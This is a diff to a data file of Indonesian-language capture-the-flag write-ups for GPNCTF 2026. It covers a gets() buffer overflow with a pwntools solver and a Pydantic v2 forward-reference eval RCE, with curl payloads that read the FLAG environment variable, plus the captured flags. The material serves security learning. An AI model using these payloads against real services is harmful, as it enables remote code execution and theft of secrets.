@@ -4,7 +4,7 @@ import type { WriteUp } from '../types';
 export const gpnctf2026Writeups: WriteUp[] = [
   {
     "id": "gpnctf2026-pwn-recipefordisaster",
-    "title": "Konfigurasi target",
+    "title": "RecipeForDisaster",
     "ctfName": "GPNCTF 2026",
     "category": "Pwn",
     "difficulty": "Medium",
@@ -12,19 +12,27 @@ export const gpnctf2026Writeups: WriteUp[] = [
     "date": "2026-06-08",
     "author": "Nattt",
     "tags": [],
-    "description": "#RecipeForDisaster",
-    "problemDescription": "#RecipeForDisaster\n\nKerentanan utama terletak pada fungsi take_order() di dalam file challenge.c. Program menggunakan fungsi gets() yang tidak aman untuk menerima input dari pengguna ke dalam buffer note.\n\nprintf(\"Any note for the chef? (leave blank for none)\\n> \");\ngets(cur->note); // <-- Vulnerability\n\n\nBuffer note didefinisikan dalam struct Item sebagai array karakter berukuran 32 byte. Tepat setelah note di dalam memori struct tersebut, terdapat variabel price bertipe integer (4 byte).\n\ntypedef struct {\n  char item[32];\n  char note[32]; // 32 bytes\n  int price;     // 4 bytes\n} Item;\n\n\nKarena gets() tidak membatasi jumlah input yang dibaca, kita dapat menulis lebih dari 32 byte ke dalam note, yang mengakibatkan memori tumpah (overflow) dan menimpa nilai variabel price di sebelahnya.\n\nStrategi Eksploitasi\n\nTujuan eksploitasi adalah memicu pemanggilan fungsi print_coupon() yang akan membaca dan mencetak isi file /flag. Fungsi ini dipanggil dari dalam verify_total() jika argumen total bernilai kurang dari 0.\n\nvoid verify_total(int total) {\n  if (total < 0) {\n    puts(\"\\n[SYSTEM] Pricing error detected! We sincerely apologise for\");\n    puts(\"[SYSTEM] the inconvenience. Please accept this coupon:\\n\");\n    print_coupon();\n    exit(0);\n  }\n  // ...\n}\n\n\nAgar nilai total menjadi negatif, kita mengeksploitasi buffer overflow pada fungsi gets().\n\nKirim 32 byte junk data (misal: A * 32) untuk memenuhi buffer note.\n\nKirim 4 byte nilai integer negatif (misal: 0xffffffff yang merupakan representasi -1 dalam memori 32-bit).\n\nSelesaikan pesanan agar program menghitung kalkulasi total.\n\nTotal pesanan akan menjadi negatif, memicu verify_total() untuk mencetak flag.\n\nScript Eksploitasi (pwntools)\n\nfrom pwn import *\n\nhost = 'boiled-strawberry-marinated-in-whipped-carbonara-feyg.gpn24.ctf.kitctf.de'\nport = 443\n\np = remote(host, port, ssl=True)\n\np.sendlineafter(b'finish: ', b'1')\n\npayload = b'A' * 32 + p32(0xffffffff)\np.sendlineafter(b'> ', payload)\n\np.sendlineafter(b'finish: ', b'0')\n\np.interactive()\n\n\nHasil\n\nEksekusi script menghasilkan total harga negatif dan memicu sistem untuk mencetak flag:\n\nFlag: GPNCTF{WA1t, wiTh THe5e PriCe5, OverflOws ShOUld n0T 8E po5Sible...}",
+    "description": "Writeup for challenge RecipeForDisaster (Pwn Challenge - GPNCTF 2026)",
+    "problemDescription": "Kerentanan utama terletak pada fungsi `take_order()` di dalam file `challenge.c`. Program menggunakan fungsi `gets()` yang tidak aman untuk menerima input dari pengguna ke dalam buffer `note`, yang mengakibatkan memori tumpah (overflow) dan menimpa nilai variabel `price` di sebelahnya.",
     "tools": [],
     "analysis": "",
     "solution": [
       {
-        "title": "Solver Script",
-        "content": "Script solver lengkap (solve.py):",
-        "code": "from pwn import *\r\n\r\n# Target server (menggunakan SSL sesuai perintah ncat di deskripsi)\r\nhost = 'boiled-strawberry-marinated-in-whipped-carbonara-feyg.gpn24.ctf.kitctf.de'\r\nport = 443\r\n\r\np = remote(host, port, ssl=True)\r\n# Jika ingin test lokal dulu, un-comment baris di bawah dan comment remote di atas:\r\n# p = process('./challenge')\r\n\r\n# Memilih menu nomor 1\r\np.sendlineafter(b'finish: ', b'1')\r\n\r\n# Payload Buffer Overflow: 32 bytes padding untuk memenuhi 'note' + 4 bytes untuk menimpa 'price' menjadi -1\r\npayload = b'A' * 32 + p32(0xffffffff)\r\np.sendlineafter(b'> ', payload)\r\n\r\n# Kirim '0' untuk menyelesaikan pesanan dan memicu kalkulasi total\r\np.sendlineafter(b'finish: ', b'0')\r\n\r\n# Menangkap sisa output (termasuk flag)\r\np.interactive()"
+        "title": "1. Analisis Kerentanan",
+        "content": "Buffer `note` didefinisikan dalam struct `Item` sebagai array karakter berukuran 32 byte. Tepat setelah `note` di dalam memori struct tersebut, terdapat variabel `price` bertipe integer (4 byte).\n\n```c\ntypedef struct {\n  char item[32];\n  char note[32]; // 32 bytes\n  int price;     // 4 bytes\n} Item;\n```\n\nKarena `gets()` tidak membatasi jumlah input yang dibaca, kita dapat menulis lebih dari 32 byte ke dalam `note`, yang mengakibatkan overflow dan menimpa `price`."
+      },
+      {
+        "title": "2. Strategi Eksploitasi",
+        "content": "Tujuan eksploitasi adalah memicu pemanggilan fungsi `print_coupon()` yang akan membaca dan mencetak isi file `/flag`. Fungsi ini dipanggil dari dalam `verify_total()` jika argumen `total` bernilai kurang dari 0.\n\n```c\nvoid verify_total(int total) {\n  if (total < 0) {\n    puts(\"\\n[SYSTEM] Pricing error detected! We sincerely apologise for\");\n    puts(\"[SYSTEM] the inconvenience. Please accept this coupon:\\n\");\n    print_coupon();\n    exit(0);\n  }\n  // ...\n}\n```\n\nAgar nilai `total` menjadi negatif, kita mengeksploitasi buffer overflow pada fungsi `gets()`. Kita mengirimkan 32 byte junk data untuk memenuhi buffer `note`, diikuti oleh 4 byte integer negatif (misalnya `0xffffffff` yang merepresentasikan `-1`)."
+      },
+      {
+        "title": "3. Solver Script",
+        "content": "Script solver lengkap (`solve.py`):",
+        "code": "from pwn import *\n\n# Target server (menggunakan SSL sesuai perintah ncat di deskripsi)\nhost = 'boiled-strawberry-marinated-in-whipped-carbonara-feyg.gpn24.ctf.kitctf.de'\nport = 443\n\np = remote(host, port, ssl=True)\n# Jika ingin test lokal dulu, un-comment baris di bawah dan comment remote di atas:\n# p = process('./challenge')\n\n# Memilih menu nomor 1\np.sendlineafter(b'finish: ', b'1')\n\n# Payload Buffer Overflow: 32 bytes padding untuk memenuhi 'note' + 4 bytes untuk menimpa 'price' menjadi -1\npayload = b'A' * 32 + p32(0xffffffff)\np.sendlineafter(b'> ', payload)\n\n# Kirim '0' untuk menyelesaikan pesanan dan memicu kalkulasi total\np.sendlineafter(b'finish: ', b'0')\n\n# Menangkap sisa output (termasuk flag)\np.interactive()"
       }
     ],
     "terminalOutputs": [],
-    "flag": "",
+    "flag": "GPNCTF{WA1t, wiTh THe5e PriCe5, OverflOws ShOUld n0T 8E po5Sible...}",
     "lessonsLearned": []
   },
   {
@@ -168,7 +176,7 @@ export const gpnctf2026Writeups: WriteUp[] = [
   },
   {
     "id": "gpnctf2026-web-restaurant-builder",
-    "title": "Restaurant  Builder",
+    "title": "Restaurant Builder",
     "ctfName": "GPNCTF 2026",
     "category": "Web",
     "difficulty": "Medium",
@@ -176,11 +184,25 @@ export const gpnctf2026Writeups: WriteUp[] = [
     "date": "2026-06-08",
     "author": "Nattt",
     "tags": [],
-    "description": "GPNCTF - Restaurant-Builder Writeup",
-    "problemDescription": "GPNCTF - Restaurant-Builder Writeup\n\nChallenge Info\n\nCategory: Web\n\nTech Stack: Python, FastAPI, Pydantic v2\n\nVulnerability Analysis\n\nThe vulnerability exists in the /blueprint/{name} POST endpoint, where the application dynamically generates a Pydantic model based on user input.\n\n@app.post(\"/blueprint/{name}\")\ndef register_blueprint(name: str, description: Dict[str,str] = Body()):\n    # ...\n    description = {k: v for k,v in description.items() if not k.startswith(\"__\")}\n    Blueprint = create_model(name, **description)\n    blueprints[name] = Blueprint\n\n\nIn Pydantic v2, if you pass a string value as a keyword argument to create_model(), it treats the string as a Forward Reference (a type annotation), not a default value.\n\nWhen the user requests the blueprint via the GET /blueprint/{name} endpoint, the application calls:\n\n@app.get(\"/blueprint/{name}\")\ndef get_blueprint(name: str):\n    # ...\n    return blueprint.model_json_schema()\n\n\nDuring model_json_schema() execution, Pydantic attempts to resolve the un-evaluated forward reference by passing the string to Python's internal eval(). This results in Remote Code Execution (RCE).\n\nExploit Strategy\n\nThe Dockerfile shows the flag is stored in the environment variable FLAG.\n\nTo extract the flag without a reverse shell, we can embed our OS command within a typing.Literal type hint. When eval() processes the string, it fetches the environment variable, and Pydantic sets the literal's value as a const field in the resulting JSON schema.\n\nPayload:\n\n__import__(\"typing\").Literal[__import__(\"os\").environ.get(\"FLAG\")]\n\n\nExecution\n\n1. Inject the payload\nRegister a new blueprint with the payload as the field value.\n\ncurl -s -X POST https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag \\\n-H \"Content-Type: application/json\" \\\n-d '{\"bocor\": \"__import__(\\\"typing\\\").Literal[__import__(\\\"os\\\").environ.get(\\\"FLAG\\\")]\"}'\n\n\n2. Trigger evaluation and leak the flag\nSend a GET request to invoke model_json_schema() and retrieve the evaluated schema.\n\ncurl -s https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag\n\n\nResulting Output:\n\n{\"properties\":{\"bocor\":{\"const\":\"GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}\",\"title\":\"Bocor\",\"type\":\"string\"}},\"required\":[\"bocor\"],\"title\":\"GetFlag\",\"type\":\"object\"}\n\n\nFlag: GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}",
-    "tools": [],
+    "description": "Writeup for challenge Restaurant Builder (Web Challenge - GPNCTF 2026)",
+    "problemDescription": "Tantangan web ini memanfaatkan bug di Pydantic v2 saat memanggil fungsi `create_model()` dengan string parameter yang akan dievaluasi sebagai Forward Reference (type annotation), yang memicu RCE saat memanggil `model_json_schema()`.",
+    "tools": ["Pydantic v2", "FastAPI"],
     "analysis": "",
-    "solution": [],
+    "solution": [
+      {
+        "title": "1. Analisis Kerentanan",
+        "content": "Kerentanan ini ada pada endpoint `POST /blueprint/{name}`, di mana aplikasi secara dinamis men-generate model Pydantic berdasarkan input user.\n\n```python\n@app.post(\"/blueprint/{name}\")\ndef register_blueprint(name: str, description: Dict[str,str] = Body()):\n    # ...\n    description = {k: v for k,v in description.items() if not k.startswith(\"__\")}\n    Blueprint = create_model(name, **description)\n    blueprints[name] = Blueprint\n```\n\nPada Pydantic v2, jika kita mengirimkan nilai string sebagai argumen keyword ke `create_model()`, Pydantic akan menganggap string tersebut sebagai Forward Reference (type annotation), bukan nilai default.\n\nKetika user meminta blueprint melalui `GET /blueprint/{name}`, aplikasi memanggil `blueprint.model_json_schema()`. Selama pemanggilan schema ini, Pydantic mencoba men-resolve forward reference dengan mengevaluasi string tersebut menggunakan fungsi bawaan Python `eval()`, yang membuka celah RCE."
+      },
+      {
+        "title": "2. Strategi Eksploitasi",
+        "content": "Berdasarkan Dockerfile, flag disimpan pada environment variable `FLAG`. Untuk mengekstrak flag secara langsung tanpa reverse shell, kita bisa menaruh payload kita di dalam tipe `typing.Literal`.\n\nPayload:\n\n```python\n__import__(\"typing\").Literal[__import__(\"os\").environ.get(\"FLAG\")]\n```"
+      },
+      {
+        "title": "3. Langkah Eksekusi",
+        "content": "Kirim payload via POST request untuk meregister blueprint baru, lalu kirim GET request untuk men-trigger evaluasi schema dan menampilkan flag.",
+        "code": "# 1. Inject the payload\ncurl -s -X POST https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag \\\n-H \"Content-Type: application/json\" \\\n-d '{\"bocor\": \"__import__(\\\"typing\\\").Literal[__import__(\\\"os\\\").environ.get(\\\"FLAG\\\")]\"}'\n\n# 2. Trigger evaluation and leak the flag\ncurl -s https://deep-fried-sardine-nestled-in-candied-mint-lcz4.gpn24.ctf.kitctf.de/blueprint/GetFlag"
+      }
+    ],
     "terminalOutputs": [],
     "flag": "GPNCTF{and_one_or_7Wo_rCE5_1A7er_THey_bui17_hAPP11y_EVer_af73R}",
     "lessonsLearned": []
